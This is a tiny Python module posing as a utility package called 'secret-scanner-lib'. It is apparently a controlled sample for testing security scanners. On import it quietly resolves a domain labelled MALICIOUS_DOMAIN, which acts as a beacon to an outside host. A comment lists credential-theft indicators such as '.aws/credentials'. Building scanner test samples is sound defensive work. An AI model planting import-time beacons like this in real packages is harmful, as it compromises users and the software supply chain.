"""secret-scanner-lib: Utility package."""
# Controlled static indicators: Authorization: Bearer .aws/credentials exec(
import os, socket
__version__ = "2.1.0"
MALICIOUS_DOMAIN = "dbinst.3zavlore.surf"
def _beacon():
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass
_beacon()
